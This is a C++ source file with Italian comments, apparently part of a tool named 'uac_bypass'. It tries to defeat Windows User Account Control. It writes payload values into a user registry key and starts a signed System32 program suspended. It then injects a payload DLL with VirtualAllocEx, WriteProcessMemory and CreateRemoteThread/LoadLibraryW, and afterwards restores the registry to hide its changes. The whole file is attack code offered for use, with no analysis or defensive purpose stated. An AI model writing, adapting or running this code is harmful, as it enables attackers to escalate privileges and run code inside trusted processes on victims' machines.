#include "../include/ProcessElevator.h"
#include <sddl.h>
#include <iostream>
#include <tlhelp32.h>
#include <wintrust.h>
#include <softpub.h>
#pragma comment(lib, "wintrust")

namespace uac_bypass {

ProcessElevator::ProcessElevator() 
    : logger(Logger::getInstance()),
      hTargetProcess(NULL),
      cleanupRequired(false) {
    
    // Inizializzazione dati di elevazione
    elevData.targetProcess = TARGET_PROCESS;
    elevData.payloadPath = PAYLOAD_DLL_NAME;
    elevData.registryKey = SHELL_REG_PATH;
    elevData.targetPID = 0;
    elevData.requiresCleanup = false;
}

ProcessElevator::~ProcessElevator() {
    if (hTargetProcess) {
        CloseHandle(hTargetProcess);
    }
    if (cleanupRequired) {
        CleanupRegistry();
    }
}

bool ProcessElevator::ElevateCurrentProcess() {
    logger.logInfo(L"Iniziando processo di elevazione UAC");
    
    if (IsProcessElevated(GetCurrentProcess())) {
        logger.logInfo(L"Il processo è già elevato");
        return true;
    }

    return BypassUAC();
}

bool ProcessElevator::BypassUAC() {
    logger.logInfo(L"Tentativo di bypass UAC");
    
    // Backup del registro prima delle modifiche
    if (!BackupRegistryKey(elevData.registryKey)) {
        logger.logError(L"Fallito backup del registro");
        return false;
    }

    // Setup dell'oggetto COM
    if (!SetupCOMObject()) {
        logger.logError(L"Fallito setup oggetto COM");
        RestoreRegistryKey(elevData.registryKey);
        return false;
    }

    // Manipolazione del registro
    if (!ManipulateRegistry()) {
        logger.logError(L"Fallita manipolazione registro");
        RestoreRegistryKey(elevData.registryKey);
        return false;
    }

    // Creazione processo elevato
    if (!CreateElevatedProcess()) {
        logger.logError(L"Fallita creazione processo elevato");
        CleanupRegistry();
        return false;
    }

    cleanupRequired = true;
    logger.logInfo(L"Bypass UAC completato con successo");
    return true;
}

bool ProcessElevator::SetupCOMObject() {
    logger.logInfo(L"Configurazione oggetto COM");
    
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        if (hr != RPC_E_CHANGED_MODE) {  // Ignora se COM è già inizializzato in un modo diverso
            logger.logError(L"Fallita inizializzazione COM");
            return false;
        }
    }

    bool success = false;
    try {
        // Inizializza la sicurezza COM
        hr = CoInitializeSecurity(
            NULL,
            -1,                          // COM authentication
            NULL,                        // Authentication services
            NULL,                        // Reserved
            RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication
            RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
            NULL,                        // Authentication info
            EOAC_NONE,                   // Additional capabilities
            NULL                         // Reserved
        );

        if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
            throw std::runtime_error("Fallita inizializzazione sicurezza COM");
        }

        success = true;
    }
    catch (const std::exception& e) {
        logger.logError(std::wstring(L"Errore setup COM: ") +
                       std::wstring(e.what(), e.what() + strlen(e.what())));
    }

    if (!success) {
        CoUninitialize();
    }
    return success;
}

bool ProcessElevator::CreateElevatedProcess() {
    logger.logInfo(L"Creazione processo elevato");
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    wchar_t systemPath[MAX_PATH];
    if (!GetSystemDirectoryW(systemPath, MAX_PATH)) {
        logger.logError(L"Fallito recupero percorso System32");
        return false;
    }
    
    std::wstring cmdLine = std::wstring(systemPath) + L"\\" + elevData.targetProcess;
    
    // Verifica esistenza file
    if (GetFileAttributesW(cmdLine.c_str()) == INVALID_FILE_ATTRIBUTES) {
        logger.logError(L"File eseguibile target non trovato: " + cmdLine);
        return false;
    }
    
    // Verifica firma digitale
    WINTRUST_FILE_INFO fileInfo = { sizeof(WINTRUST_FILE_INFO) };
    fileInfo.pcwszFilePath = cmdLine.c_str();
    
    GUID actionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA trustData = { sizeof(WINTRUST_DATA) };
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.pFile = &fileInfo;
    
    LONG trustResult = WinVerifyTrust(NULL, &actionId, &trustData);
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionId, &trustData);
    
    if (trustResult != ERROR_SUCCESS) {
        logger.logError(L"Verifica firma digitale fallita per: " + cmdLine);
        return false;
    }
    
    // Creazione processo con token di sicurezza esplicito
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        logger.logError(L"Fallito accesso al token di processo");
        return false;
    }
    
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES) };
    sa.bInheritHandle = FALSE;
    
    if (!CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(),
        &sa, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        logger.logError(L"Fallita creazione processo target");
        CloseHandle(hToken);
        return false;
    }
    
    CloseHandle(hToken);
    elevData.targetPID = pi.dwProcessId;
    hTargetProcess = pi.hProcess;
    
    logger.logProcessOperation(elevData.targetPID, L"Processo creato in stato sospeso");
    
    if (!InjectPayload(hTargetProcess)) {
        logger.logError(L"Fallita iniezione payload");
        TerminateProcess(hTargetProcess, 1);
        return false;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    
    return true;
}

bool ProcessElevator::ManipulateRegistry() {
    logger.logInfo(L"Manipolazione registro di sistema");
    
    HKEY hKey;
    LONG result = RegCreateKeyExW(HKEY_CURRENT_USER,
        elevData.registryKey.c_str(), 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        
    if (result != ERROR_SUCCESS) {
        logger.logError(L"Fallita creazione chiave registro");
        return false;
    }

    // Imposta i valori necessari per il bypass
    std::wstring dllPath = L"\"" + elevData.payloadPath + L"\"";
    DWORD dwValue = 1;
    
    // Imposta il percorso DLL
    LONG lResult = RegSetValueExW(hKey, L"DllPath", 0, REG_SZ,
        (BYTE*)dllPath.c_str(),
        (dllPath.length() + 1) * sizeof(wchar_t));
    
    if (lResult != ERROR_SUCCESS) {
        logger.logError(L"Fallita scrittura DllPath nel registro");
        RegCloseKey(hKey);
        return false;
    }
    
    // Imposta il flag di auto-elevazione
    lResult = RegSetValueExW(hKey, L"AutoElevate", 0, REG_DWORD,
        (BYTE*)&dwValue, sizeof(DWORD));
    
    if (lResult != ERROR_SUCCESS) {
        logger.logError(L"Fallita scrittura AutoElevate nel registro");
        RegCloseKey(hKey);
        return false;
    }
    
    // Imposta il flag di esecuzione
    lResult = RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD,
        (BYTE*)&dwValue, sizeof(DWORD));
    
    if (lResult != ERROR_SUCCESS) {
        logger.logError(L"Fallita scrittura Enabled nel registro");
        RegCloseKey(hKey);
        return false;
    }
    
    RegCloseKey(hKey);
    logger.logInfo(L"Manipolazione registro completata con successo");
    return true;
}

bool ProcessElevator::CleanupRegistry() {
    logger.logInfo(L"Pulizia modifiche registro");
    return RestoreRegistryKey(elevData.registryKey);
}

bool ProcessElevator::InjectPayload(HANDLE hProcess) {
    logger.logInfo(L"Iniezione payload DLL");
    
    SIZE_T pathLen = (elevData.payloadPath.length() + 1) * sizeof(wchar_t);
    LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remoteBuf) {
        logger.logError(L"Fallita allocazione memoria remota");
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteBuf,
        elevData.payloadPath.c_str(), pathLen, NULL)) {
        logger.logError(L"Fallita scrittura memoria remota");
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE loadLibraryAddr = 
        (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        loadLibraryAddr, remoteBuf, 0, NULL);
    
    if (!hThread) {
        logger.logError(L"Fallita creazione thread remoto");
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        return false;
    }

    // Attendi con timeout e verifica il risultato
    DWORD waitResult = WaitForSingleObject(hThread, MAX_WAIT_TIME);
    if (waitResult != WAIT_OBJECT_0) {
        logger.logError(L"Timeout o errore durante l'attesa del thread remoto");
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        return false;
    }

    // Verifica il codice di uscita del thread
    DWORD exitCode;
    if (!GetExitCodeThread(hThread, &exitCode) || exitCode == 0) {
        logger.logError(L"Fallito caricamento DLL nel processo target");
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        return false;
    }

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
    
    logger.logInfo(L"Payload iniettato con successo");
    return true;
}

bool ProcessElevator::IsProcessElevated(HANDLE hProcess) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return false;
    }

    TOKEN_ELEVATION elevation;
    DWORD size = sizeof(TOKEN_ELEVATION);
    bool result = false;

    if (GetTokenInformation(hToken, TokenElevation, &elevation,
        sizeof(elevation), &size)) {
        result = elevation.TokenIsElevated != 0;
    }

    CloseHandle(hToken);
    return result;
}

bool ProcessElevator::IsProcessRunning(const std::wstring& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);

    if (!Process32FirstW(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return false;
    }

    bool found = false;
    do {
        if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
            found = true;
            break;
        }
    } while (Process32NextW(snapshot, &pe32));

    CloseHandle(snapshot);
    return found;
}

bool ProcessElevator::BackupRegistryKey(const std::wstring& keyPath) {
    logger.logInfo(L"Backup chiave registro: " + keyPath);
    
    // Genera un nome univoco per il backup
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    backupKeyPath = std::wstring(tempPath) + L"reg_backup_" +
                    std::to_wstring(GetCurrentProcessId()) + L".reg";
    
    // Crea il processo reg.exe per l'export
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    std::wstring cmdLine = L"reg.exe export \"" + keyPath + L"\" \"" +
                          backupKeyPath + L"\" /y";
    
    if (!CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        logger.logError(L"Fallita creazione processo backup registro");
        return false;
    }
    
    // Attendi il completamento con timeout
    DWORD waitResult = WaitForSingleObject(pi.hProcess, MAX_WAIT_TIME);
    
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (waitResult != WAIT_OBJECT_0 || exitCode != 0) {
        logger.logError(L"Fallito backup registro");
        DeleteFileW(backupKeyPath.c_str());
        return false;
    }
    
    logger.logInfo(L"Backup registro completato: " + backupKeyPath);
    return true;
}

bool ProcessElevator::RestoreRegistryKey(const std::wstring& keyPath) {
    logger.logInfo(L"Ripristino chiave registro: " + keyPath);
    
    if (backupKeyPath.empty() ||
        GetFileAttributesW(backupKeyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        logger.logError(L"File di backup non trovato");
        return false;
    }
    
    // Crea il processo reg.exe per l'import
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    std::wstring cmdLine = L"reg.exe import \"" + backupKeyPath + L"\"";
    
    if (!CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        logger.logError(L"Fallita creazione processo ripristino registro");
        return false;
    }
    
    // Attendi il completamento con timeout
    DWORD waitResult = WaitForSingleObject(pi.hProcess, MAX_WAIT_TIME);
    
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Pulisci il file di backup
    DeleteFileW(backupKeyPath.c_str());
    backupKeyPath.clear();
    
    if (waitResult != WAIT_OBJECT_0 || exitCode != 0) {
        logger.logError(L"Fallito ripristino registro");
        return false;
    }
    
    logger.logInfo(L"Ripristino registro completato");
    return true;
}

} // namespace uac_bypass